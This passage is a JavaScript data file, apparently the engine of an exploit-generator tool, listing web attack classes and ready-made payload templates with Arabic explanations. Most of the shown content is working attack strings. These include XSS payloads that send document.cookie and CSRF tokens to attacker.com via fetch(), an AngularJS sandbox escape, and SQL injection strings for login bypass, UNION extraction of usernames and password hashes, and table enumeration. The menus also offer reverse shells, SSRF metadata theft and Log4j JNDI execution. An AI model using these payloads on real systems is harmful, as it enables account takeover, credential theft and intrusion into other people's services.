// ==========================================
// MASTERCLASS EXPLOIT ARSENAL ENGINE (v5)
// ==========================================

const VulnData = {
  xss: {
    contexts: [
      { id: 'html_body', label: 'HTML Body (e.g. <div>[here]</div>)' },
      { id: 'attribute_dq', label: 'Attribute - Double Quotes (e.g. value="[here]")' },
      { id: 'attribute_sq', label: 'Attribute - Single Quotes (e.g. value=\'[here]\')' },
      { id: 'script_string', label: 'Inside <script> String (e.g. var x = "[here]";)' },
      { id: 'svg', label: 'SVG Context (<svg>)' },
      { id: 'markdown', label: 'Markdown Link ([a](...))' },
      { id: 'angular', label: 'AngularJS Template ({{...}})' }
    ],
    actions: [
      { id: 'alert', label: 'Alert Popup (Proof of Concept)' },
      { id: 'cookie_steal', label: 'Steal Cookies' },
      { id: 'dom_read', label: 'Read DOM / CSRF Token' }
    ]
  },
  sqli: {
    contexts: [
      { id: 'int', label: 'Integer (e.g. id=[here])' },
      { id: 'string_dq', label: 'String - Double Quotes (e.g. name="[here]")' },
      { id: 'string_sq', label: 'String - Single Quotes (e.g. name=\'[here]\')' }
    ],
    actions: [
      { id: 'auth_bypass', label: 'Authentication Bypass (OR 1=1)' },
      { id: 'union_extract', label: 'UNION Data Extraction' },
      { id: 'enum_tables', label: 'Enumerate Tables (information_schema)' },
      { id: 'enum_columns', label: 'Enumerate Columns (information_schema)' },
      { id: 'error_extract', label: 'Error-Based Extraction' },
      { id: 'time_delay', label: 'Time-Based Delay (SLEEP)' }
    ]
  },
  ssrf: {
    contexts: [
      { id: 'url_param', label: 'Full URL Parameter (e.g. ?url=[here])' },
      { id: 'path_append', label: 'Path Append (e.g. api.com/[here])' }
    ],
    actions: [
      { id: 'aws_metadata', label: 'AWS Metadata Exfiltration' },
      { id: 'gcp_metadata', label: 'GCP Metadata Exfiltration' },
      { id: 'localhost_port', label: 'Localhost Port Scan' },
      { id: 'ipv6_bypass', label: 'IPv6 Localhost Bypass' }
    ]
  },
  lfi: {
    contexts: [
      { id: 'direct_file', label: 'Direct File Inclusion (e.g. ?file=[here])' },
      { id: 'path_traversal', label: 'Path Traversal (e.g. ?file=folder/[here])' }
    ],
    actions: [
      { id: 'read_passwd', label: 'Read /etc/passwd' },
      { id: 'read_win_ini', label: 'Read C:\\Windows\\win.ini' },
      { id: 'php_wrapper', label: 'PHP Wrapper (Base64 Extract)' }
    ]
  },
  cmdi: {
    contexts: [
      { id: 'direct', label: 'Direct Execution (e.g. ?cmd=[here])' },
      { id: 'blind', label: 'Blind / Chained Execution (e.g. ping [here])' }
    ],
    actions: [
      { id: 'rev_shell', label: 'Reverse Shell (Bash)' },
      { id: 'read_file', label: 'Read /etc/passwd' },
      { id: 'ping_delay', label: 'Ping Delay (Blind PoC)' }
    ]
  },
  ssti: {
    contexts: [
      { id: 'jinja2', label: 'Jinja2 / Twig (Python/PHP)' },
      { id: 'erb', label: 'ERB (Ruby)' }
    ],
    actions: [
      { id: 'math', label: 'Math Evaluation (PoC)' },
      { id: 'rce', label: 'Remote Code Execution' }
    ]
  },
  xxe: {
    contexts: [
      { id: 'classic_xml', label: 'Classic XML Payload' },
      { id: 'soap_body', label: 'SOAP Body Payload' }
    ],
    actions: [
      { id: 'local_file', label: 'Read Local File (/etc/passwd)' },
      { id: 'oob', label: 'Out-Of-Band (OOB) Extraction' }
    ]
  },
  csrf: {
    contexts: [
      { id: 'html_form', label: 'Auto-submitting HTML Form' },
      { id: 'ajax_fetch', label: 'AJAX / Fetch API Request' }
    ],
    actions: [
      { id: 'state_change', label: 'State Change (e.g. Change Email)' }
    ]
  },
  open_redirect: {
    contexts: [
      { id: 'url_param', label: 'URL Parameter (e.g. ?redirect=[here])' },
      { id: 'path_based', label: 'Path-based (e.g. /out/[here])' }
    ],
    actions: [
      { id: 'phishing', label: 'Redirect to Phishing Domain' },
      { id: 'js_exec', label: 'JavaScript Execution (javascript:alert)' }
    ]
  },
  cors: {
    contexts: [
      { id: 'null_origin', label: 'Null Origin Reflection' },
      { id: 'arb_origin', label: 'Arbitrary Origin Reflection' }
    ],
    actions: [
      { id: 'steal_api', label: 'Exfiltrate API Keys via XHR (withCredentials)' }
    ]
  },
  nosqli: {
    contexts: [
      { id: 'json_body', label: 'JSON Body (e.g. {"username": [here]})' },
      { id: 'url_query', label: 'URL Query Param (e.g. ?username[here])' }
    ],
    actions: [
      { id: 'auth_bypass', label: 'Authentication Bypass ($ne)' },
      { id: 'regex_extract', label: 'Regex Data Extraction ($regex)' }
    ]
  },
  ldap: {
    contexts: [
      { id: 'filter_string', label: 'Inside LDAP Filter (e.g. (uid=[here]))' }
    ],
    actions: [
      { id: 'auth_bypass', label: 'Wildcard Auth Bypass (*)' },
      { id: 'attr_extract', label: 'Attribute Extraction' }
    ]
  },
  smuggling: {
    contexts: [
      { id: 'cl_te', label: 'CL.TE (Front-end Content-Length, Back-end Transfer-Encoding)' },
      { id: 'te_cl', label: 'TE.CL (Front-end Transfer-Encoding, Back-end Content-Length)' }
    ],
    actions: [
      { id: 'req_smuggle', label: 'Smuggle HTTP Request to Next User' }
    ]
  },
  log4j: {
    contexts: [
      { id: 'header_user_agent', label: 'User-Agent / Header Context' },
      { id: 'input_param', label: 'Search / Input Parameter' }
    ],
    actions: [
      { id: 'jndi_rce', label: 'JNDI LDAP Remote Code Execution' }
    ]
  }
};

const PayloadTemplates = {
  xss: {
    alert: {
      html_body: {
        code: "<script>alert(document.domain)</script>",
        breakout: "",
        template: "<div>Results for: [USER_INPUT]</div>",
        simulatedType: "dialog",
        simulatedVal: "example.com",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79 (Cross-site Scripting)",
        capec: "CAPEC-63",
        stars: "★★☆☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["HTML Body Context", "No Output Encoding (HTML Entity)", "No Content Security Policy (CSP) blocking inline scripts"],
        pipeline: [
          { title: "Payload Submission", desc: "User submits raw payload in HTTP parameter." },
          { title: "HTML Reflection", desc: "Server reflects payload directly into the DOM inside a <div>." },
          { title: "HTML Parsing", desc: "Browser HTML parser encounters <script> tag and stops to execute JS." },
          { title: "Execution Fired", desc: "JavaScript engine runs alert(document.domain)." }
        ],
        desc: "حقن مباشر لوسم `script`. ينجح عندما يتم وضع مدخلاتك مباشرة داخل هيكل الـ HTML دون فلترة."
      },
      attribute_dq: {
        code: "\"><script>alert(document.domain)</script>",
        breakout: "\">",
        template: "<input type=\"text\" name=\"search\" value=\"[USER_INPUT]\">",
        simulatedType: "dialog",
        simulatedVal: "example.com",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79 (Attribute Context XSS)",
        capec: "CAPEC-63",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Double Quote Attribute Context", "No Attribute Encoding", "Unsanitized > character"],
        pipeline: [
          { title: "Attribute Injection", desc: "Payload injected into value=\"...\" attribute." },
          { title: "Context Breakout", desc: "\"> characters close the input tag prematurely." },
          { title: "DOM Injection", desc: "<script> tag is injected into the top-level HTML hierarchy." },
          { title: "Execution Fired", desc: "Browser evaluates script and triggers alert." }
        ],
        desc: "يقوم بكسر سمة الـ HTML (Attribute) التي تستخدم علامتي التنصيص المزدوجة باستخدام `\">` ثم يحقن الكود."
      },
      attribute_sq: {
        code: "'><script>alert(document.domain)</script>",
        breakout: "'>",
        template: "<input type='text' name='search' value='[USER_INPUT]'>",
        simulatedType: "dialog",
        simulatedVal: "example.com",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79",
        capec: "CAPEC-63",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Single Quote Attribute Context", "Unsanitized ' and > characters"],
        pipeline: [
          { title: "Attribute Injection", desc: "Payload injected into single-quoted attribute." },
          { title: "Context Breakout", desc: "'> closes single quote and tag." },
          { title: "DOM Injection", desc: "Script tag parsed." },
          { title: "Execution Fired", desc: "Alert dialog triggered." }
        ],
        desc: "يقوم بكسر سمة الـ HTML التي تستخدم علامة التنصيص المفردة باستخدام `'>`."
      },
      script_string: {
        code: "\"; alert(document.domain); //",
        breakout: "\";",
        template: "<script> var keyword = \"[USER_INPUT]\"; </script>",
        simulatedType: "dialog",
        simulatedVal: "example.com",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79 (JavaScript Context)",
        capec: "CAPEC-63",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["JavaScript String Context", "Unsanitized \" and ; characters"],
        pipeline: [
          { title: "JS String Injection", desc: "Injected inside var str = \"...\"" },
          { title: "JS Breakout", desc: "\"; terminates JS string statement." },
          { title: "Command Injection", desc: "alert() executed as standalone JS command." },
          { title: "Code Commenting", desc: "// comments out remaining syntax." }
        ],
        desc: "يقوم بكسر السلسلة النصية داخل كود جافاسكريبت باستخدام `\";` لتنفيذ الكود، ثم يتجاهل باقي السطر باستخدام `//`."
      },
      svg: {
        code: "<svg onload=alert(1)>",
        breakout: "",
        template: "<div class=\"user-avatar\">[USER_INPUT]</div>",
        simulatedType: "dialog",
        simulatedVal: "1",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79 (Filter Evasion)",
        capec: "CAPEC-63",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Allowed SVG/XML tags", "WAF blocks <script> but allows <svg>"],
        pipeline: [
          { title: "XML/SVG Injection", desc: "<svg> element injected into DOM." },
          { title: "Event Registration", desc: "onload event handler attached." },
          { title: "DOM Rendering", desc: "Browser parses vector graphics element." },
          { title: "Execution Fired", desc: "onload event fires alert(1)." }
        ],
        desc: "يستخدم وسم `svg` مع حدث `onload`. هذا الكود يتخطى الكثير من الفلاتر التي تركز فقط على منع وسم `script`."
      },
      markdown: {
        code: "[a](javascript:alert(1))",
        breakout: "",
        template: "<div class=\"comment-body\">User Bio: [USER_INPUT]</div>",
        simulatedType: "dialog",
        simulatedVal: "1",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79",
        capec: "CAPEC-63",
        stars: "★★☆☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Markdown Parser active", "Unsanitized javascript: pseudo-protocol in links"],
        pipeline: [
          { title: "Markdown Injection", desc: "Markdown link syntax submitted." },
          { title: "HTML Translation", desc: "Parser translates to <a href=\"javascript:alert(1)\">" },
          { title: "User Click", desc: "Victim clicks generated link." },
          { title: "Execution Fired", desc: "Browser executes JS pseudo-protocol." }
        ],
        desc: "يستغل معالجات الـ Markdown التي لا تقوم بفلترة سمة `href` داخل الروابط."
      },
      angular: {
        code: "{{$on.constructor('alert(1)')()}}",
        breakout: "{{",
        template: "<div ng-app>Welcome, [USER_INPUT]</div>",
        simulatedType: "dialog",
        simulatedVal: "1",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-94 (Code Injection / Client Template)",
        capec: "CAPEC-63",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Client-Side Template Framework (AngularJS v1.x)", "Unescaped Interpolation Brackets {{ }}"],
        pipeline: [
          { title: "Template Injection", desc: "{{ }} expressions injected into HTML." },
          { title: "Angular Interpolation", desc: "Angular compiler evaluates expression." },
          { title: "Sandbox Escape", desc: "$on.constructor reaches Function constructor." },
          { title: "Execution Fired", desc: "Arbitrary JS executed in window scope." }
        ],
        desc: "تخطي حماية (Sandbox) الخاصة ببيئة AngularJS للوصول إلى دالة الـ constructor وتنفيذ أوامر جافاسكريبت."
      }
    },
    cookie_steal: {
      html_body: {
        code: "<img src=x onerror=\"fetch('https://attacker.com/log?c='+document.cookie)\">",
        breakout: "",
        template: "<div>Profile Name: [USER_INPUT]</div>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?c=session_id=9f8234a1bc89...",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79 & CWE-200",
        capec: "CAPEC-63",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["HTML Context", "Cookies without HttpOnly flag", "No CSP blocking outbound fetch"],
        pipeline: [
          { title: "Payload Injection", desc: "<img> tag with invalid src=x submitted." },
          { title: "Resource Error", desc: "Browser fails to load image from 'x'." },
          { title: "onerror Trigger", desc: "onerror event handler executes JS payload." },
          { title: "Exfiltration", desc: "fetch() sends document.cookie to attacker server." }
        ],
        desc: "يستخدم وسم صورة برابط خاطئ لإجبار المتصفح على تشغيل حدث `onerror`، والذي بدوره يسرق ملفات تعريف الارتباط (Cookies) ويرسلها للمخترق."
      },
      attribute_dq: {
        code: "\" autofocus onfocus=\"fetch('https://attacker.com/log?c='+document.cookie)\"",
        breakout: "\"",
        template: "<input type=\"text\" id=\"bio\" value=\"[USER_INPUT]\">",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?c=session_id=9f8234a1bc89...",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79",
        capec: "CAPEC-63",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Attribute Context", "HttpOnly disabled on sensitive cookies"],
        pipeline: [
          { title: "Attribute Breakout", desc: "\" closes input value." },
          { title: "HTML5 Autofocus", desc: "autofocus forces browser focus on load." },
          { title: "onfocus Event", desc: "onfocus event fires automatically." },
          { title: "Exfiltration", desc: "Cookies transmitted outbound." }
        ],
        desc: "يكسر السمة ويحقن خصائص `autofocus` و `onfocus` لتنفيذ الكود وسرقة الكوكيز تلقائياً دون تفاعل من المستخدم."
      },
      attribute_sq: {
        code: "' autofocus onfocus='fetch(`https://attacker.com/log?c=`+document.cookie)'",
        breakout: "'",
        template: "<input type='text' id='bio' value='[USER_INPUT]'>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?c=session_id=9f8234a1bc89...",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79",
        capec: "CAPEC-63",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Single Quote Context"],
        pipeline: [
          { title: "Attribute Breakout", desc: "' closes value." },
          { title: "Autofocus Trigger", desc: "Focus triggered." },
          { title: "Exfiltration", desc: "Cookies logged." }
        ],
        desc: "نفس الكود السابق ولكن لكسر علامة التنصيص المفردة."
      },
      script_string: {
        code: "\"; fetch('https://attacker.com/log?c='+document.cookie); //",
        breakout: "\";",
        template: "<script> var userBio = \"[USER_INPUT]\"; </script>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?c=session_id=9f8234a1bc89...",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79",
        capec: "CAPEC-63",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["JS String Context"],
        pipeline: [
          { title: "String Breakout", desc: "\"; terminates string." },
          { title: "Direct Fetch", desc: "fetch() called directly." },
          { title: "Exfiltration", desc: "Cookies logged." }
        ],
        desc: "يكسر السلسلة النصية وينفذ أمر إرسال الكوكيز للمخترق مباشرة داخل سياق الجافاسكريبت."
      },
      svg: {
        code: "<svg onload=\"fetch('https://attacker.com/log?c='+document.cookie)\">",
        breakout: "",
        template: "<div>User Badge: [USER_INPUT]</div>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?c=session_id=9f8234a1bc89...",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79",
        capec: "CAPEC-63",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Allowed SVG tags"],
        pipeline: [
          { title: "SVG Injection", desc: "<svg> parsed." },
          { title: "onload Trigger", desc: "onload fires." },
          { title: "Exfiltration", desc: "Cookies logged." }
        ],
        desc: "يسرق الكوكيز بمجرد تحميل رسمة الـ SVG."
      },
      markdown: {
        code: "[a](javascript:fetch('https://attacker.com/log?c='+document.cookie))",
        breakout: "",
        template: "<p>Website: [USER_INPUT]</p>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?c=session_id=9f8234a1bc89...",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79",
        capec: "CAPEC-63",
        stars: "★★☆☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Markdown Link Context"],
        pipeline: [
          { title: "Link Click", desc: "User clicks link." },
          { title: "Exfiltration", desc: "Cookies logged." }
        ],
        desc: "يسرق الكوكيز بمجرد أن يقوم الضحية بالضغط على الرابط (Markdown Link)."
      },
      angular: {
        code: "{{$on.constructor('fetch(`https://attacker.com/log?c=`+document.cookie)')()}}",
        breakout: "{{",
        template: "<div ng-app>User Status: [USER_INPUT]</div>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?c=session_id=9f8234a1bc89...",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-94",
        capec: "CAPEC-63",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["AngularJS Framework"],
        pipeline: [
          { title: "Interpolation", desc: "Angular compiles {{ }}" },
          { title: "Exfiltration", desc: "Cookies logged." }
        ],
        desc: "تخطي بيئة AngularJS لسرقة الكوكيز عبر استدعاء دوال خارجية."
      }
    },
    dom_read: {
      html_body: {
        code: "<script>fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content)</script>",
        breakout: "",
        template: "<div>[USER_INPUT]</div>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?token=csrf_token_88f91a...",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79",
        capec: "CAPEC-63",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["HTML Context"],
        pipeline: [
          { title: "DOM Extraction", desc: "DOM queried for csrf-token meta tag." },
          { title: "Exfiltration", desc: "Token transmitted." }
        ],
        desc: "يقرأ رمز الـ CSRF المخفي داخل الصفحة (DOM) ويرسله لخادم المخترق."
      },
      attribute_dq: {
        code: "\"><script>fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content)</script>",
        breakout: "\">",
        template: "<input name=\"custom\" value=\"[USER_INPUT]\">",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?token=csrf_token_88f91a...",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79",
        capec: "CAPEC-63",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Attribute Context"],
        pipeline: [
          { title: "DOM Extraction", desc: "Token extracted." }
        ],
        desc: "يكسر السمة المزدوجة ويقرأ رمز الـ CSRF."
      },
      attribute_sq: {
        code: "'><script>fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content)</script>",
        breakout: "'>",
        template: "<input name='custom' value='[USER_INPUT]'>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?token=csrf_token_88f91a...",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79",
        capec: "CAPEC-63",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Attribute Context"],
        pipeline: [
          { title: "DOM Extraction", desc: "Token extracted." }
        ],
        desc: "يكسر السمة المفردة ويقرأ رمز الـ CSRF."
      },
      script_string: {
        code: "\"; fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content); //",
        breakout: "\";",
        template: "<script> var customVal = \"[USER_INPUT]\"; </script>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?token=csrf_token_88f91a...",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79",
        capec: "CAPEC-63",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["JS String Context"],
        pipeline: [
          { title: "DOM Extraction", desc: "Token extracted." }
        ],
        desc: "يكسر سلسلة الجافاسكريبت ويقرأ رمز الـ CSRF."
      },
      svg: {
        code: "<svg onload=\"fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content)\">",
        breakout: "",
        template: "<div>[USER_INPUT]</div>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?token=csrf_token_88f91a...",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79",
        capec: "CAPEC-63",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Allowed SVG tags"],
        pipeline: [
          { title: "DOM Extraction", desc: "Token extracted." }
        ],
        desc: "يقرأ رمز الـ CSRF بمجرد عرض הـ SVG."
      },
      markdown: {
        code: "[a](javascript:fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content))",
        breakout: "",
        template: "<div>[USER_INPUT]</div>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?token=csrf_token_88f91a...",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-79",
        capec: "CAPEC-63",
        stars: "★★☆☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Markdown Link Context"],
        pipeline: [
          { title: "DOM Extraction", desc: "Token extracted." }
        ],
        desc: "يقرأ البيانات الحساسة من الصفحة ويرسلها بمجرد الضغط على الرابط."
      },
      angular: {
        code: "{{$on.constructor('fetch(`https://attacker.com/log?token=`+document.getElementsByName(`csrf-token`)[0].content)')()}}",
        breakout: "{{",
        template: "<div ng-app>[USER_INPUT]</div>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?token=csrf_token_88f91a...",
        owasp: "A03:2021 - Injection",
        cwe: "CWE-94",
        capec: "CAPEC-63",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["AngularJS Framework"],
        pipeline: [
          { title: "DOM Extraction", desc: "Token extracted." }
        ],
        desc: "تخطي AngularJS لقراءة الـ DOM."
      }
    }
  },
  sqli: {
    auth_bypass: {
      int: {
        code: "1 OR 1=1",
        breakout: "",
        template: "SELECT * FROM users WHERE id = [USER_INPUT] AND active = 1;",
        simulatedType: "db_success",
        simulatedVal: "Authentication Bypassed! Logged in as Administrator (id: 1).",
        owasp: "A03:2021 - SQL Injection",
        cwe: "CWE-89",
        capec: "CAPEC-66",
        stars: "★★☆☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Unsanitized Integer Parameter in SQL WHERE clause"],
        pipeline: [
          { title: "SQL Injection", desc: "1 OR 1=1 injected into query." },
          { title: "Syntax Parsing", desc: "Database parses OR 1=1 condition." },
          { title: "Tautology Evaluation", desc: "1=1 evaluates to TRUE for all rows." },
          { title: "Bypass Auth", desc: "First user record returned." }
        ],
        desc: "يقوم بتعديل جملة الاستعلام (WHERE) لتكون صحيحة دائماً (لأن 1=1 صحيحة دائماً)، مما يسمح بتخطي تسجيل الدخول."
      },
      string_dq: {
        code: "\" OR \"1\"=\"1",
        breakout: "\" OR \"1\"=\"1",
        template: "SELECT * FROM users WHERE username = \"[USER_INPUT]\" AND password = \"pass\";",
        simulatedType: "db_success",
        simulatedVal: "Authentication Bypassed! Logged in as Administrator (id: 1).",
        owasp: "A03:2021 - SQL Injection",
        cwe: "CWE-89",
        capec: "CAPEC-66",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Double Quote SQL String Context"],
        pipeline: [
          { title: "String Breakout", desc: "\" closes string." },
          { title: "Tautology", desc: "OR \"1\"=\"1 appended." },
          { title: "Bypass Auth", desc: "Admin record returned." }
        ],
        desc: "يغلق علامة التنصيص المزدوجة ويضيف شرطاً صحيحاً دائماً."
      },
      string_sq: {
        code: "' OR '1'='1",
        breakout: "' OR '1'='1",
        template: "SELECT * FROM users WHERE username = '[USER_INPUT]' AND password = 'pass';",
        simulatedType: "db_success",
        simulatedVal: "Authentication Bypassed! Logged in as Administrator (id: 1).",
        owasp: "A03:2021 - SQL Injection",
        cwe: "CWE-89",
        capec: "CAPEC-66",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Single Quote SQL String Context"],
        pipeline: [
          { title: "String Breakout", desc: "' closes string." },
          { title: "Tautology", desc: "OR '1'='1 appended." },
          { title: "Bypass Auth", desc: "Admin record returned." }
        ],
        desc: "يغلق علامة التنصيص المفردة ويضيف شرطاً صحيحاً دائماً لتخطي المصادقة."
      }
    },
    union_extract: {
      int: {
        code: "-1 UNION SELECT username, password FROM users-- -",
        breakout: "-1 UNION",
        template: "SELECT id, product_name FROM products WHERE category_id = [USER_INPUT];",
        simulatedType: "db_table",
        simulatedVal: "[ {username: 'admin', password: '$2y$10$e89...'}, {username: 'john_doe', password: '$2y$10$9a1...'} ]",
        owasp: "A03:2021 - SQL Injection",
        cwe: "CWE-89",
        capec: "CAPEC-66",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Equal column count between original and UNION queries"],
        pipeline: [
          { title: "Query Invalidation", desc: "-1 forces original query to return 0 rows." },
          { title: "UNION Execution", desc: "Database executes secondary SELECT users." },
          { title: "Result Merging", desc: "Attacker results merged into HTTP response." }
        ],
        desc: "يستخدم -1 لجعل الاستعلام الأول فارغاً، ثم يدمج معه نتائج استعلام ثانٍ (UNION) لجلب أسماء المستخدمين وكلمات المرور."
      },
      string_dq: {
        code: "\" UNION SELECT username, password FROM users-- -",
        breakout: "\" UNION",
        template: "SELECT id, product_name FROM products WHERE category_name = \"[USER_INPUT]\";",
        simulatedType: "db_table",
        simulatedVal: "[ {username: 'admin', password: '$2y$10$e89...'}, {username: 'john_doe', password: '$2y$10$9a1...'} ]",
        owasp: "A03:2021 - SQL Injection",
        cwe: "CWE-89",
        capec: "CAPEC-66",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Double Quote Context"],
        pipeline: [
          { title: "UNION Execution", desc: "Data extracted." }
        ],
        desc: "يغلق علامة التنصيص المزدوجة ويستخدم UNION لاستخراج البيانات."
      },
      string_sq: {
        code: "' UNION SELECT username, password FROM users-- -",
        breakout: "' UNION",
        template: "SELECT id, product_name FROM products WHERE category_name = '[USER_INPUT]';",
        simulatedType: "db_table",
        simulatedVal: "[ {username: 'admin', password: '$2y$10$e89...'}, {username: 'john_doe', password: '$2y$10$9a1...'} ]",
        owasp: "A03:2021 - SQL Injection",
        cwe: "CWE-89",
        capec: "CAPEC-66",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Single Quote Context"],
        pipeline: [
          { title: "UNION Execution", desc: "Data extracted." }
        ],
        desc: "يغلق علامة التنصيص المفردة ويستخدم UNION لاستخراج البيانات."
      }
    },
    enum_tables: {
      int: {
        code: "-1 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()-- -",
        breakout: "-1 UNION",
        template: "SELECT id, name FROM categories WHERE id = [USER_INPUT];",
        simulatedType: "db_table",
        simulatedVal: "[ {table_name: 'users'}, {table_name: 'payments'}, {table_name: 'user_tokens'} ]",
        owasp: "A03:2021 - SQL Injection",
        cwe: "CWE-89",
        capec: "CAPEC-66",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Access to information_schema metadata tables"],
        pipeline: [
          { title: "Schema Query", desc: "Queries information_schema.tables." },
          { title: "Table Enumeration", desc: "Returns all table names." }
        ],
        desc: "يستخرج أسماء جميع الجداول الموجودة في قاعدة البيانات الحالية عن طريق الاستعلام من الفهرس `information_schema.tables`."
      },
      string_dq: {
        code: "\" UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()-- -",
        breakout: "\" UNION",
        template: "SELECT id, name FROM categories WHERE slug = \"[USER_INPUT]\";",
        simulatedType: "db_table",
        simulatedVal: "[ {table_name: 'users'}, {table_name: 'payments'}, {table_name: 'user_tokens'} ]",
        owasp: "A03:2021 - SQL Injection",
        cwe: "CWE-89",
        capec: "CAPEC-66",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Double Quote Context"],
        pipeline: [
          { title: "Schema Query", desc: "Tables enumerated." }
        ],
        desc: "يكسر السلسلة ويستخرج أسماء الجداول."
      },
      string_sq: {
        code: "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()-- -",
        breakout: "' UNION",
        template: "SELECT id, name FROM categories WHERE slug = '[USER_INPUT]';",
        simulatedType: "db_table",
        simulatedVal: "[ {table_name: 'users'}, {table_name: 'payments'}, {table_name: 'user_tokens'} ]",
        owasp: "A03:2021 - SQL Injection",
        cwe: "CWE-89",
        capec: "CAPEC-66",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Single Quote Context"],
        pipeline: [
          { title: "Schema Query", desc: "Tables enumerated." }
        ],
        desc: "يكسر السلسلة المفردة ويستخرج أسماء الجداول."
      }
    },
    enum_columns: {
      int: {
        code: "-1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='[YOUR_TABLE_NAME]'-- -",
        breakout: "-1 UNION",
        template: "SELECT id, name FROM items WHERE id = [USER_INPUT];",
        simulatedType: "db_table",
        simulatedVal: "[ {column_name: 'user_id'}, {column_name: 'email_address'}, {column_name: 'password_hash'} ]",
        owasp: "A03:2021 - SQL Injection",
        cwe: "CWE-89",
        capec: "CAPEC-66",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Target Table Name known"],
        pipeline: [
          { title: "Column Enumeration", desc: "Returns columns for target table." }
        ],
        desc: "يستخرج أسماء الأعمدة لجدول معين (قم باستبدال [YOUR_TABLE_NAME] باسم الجدول المستهدف)."
      },
      string_dq: {
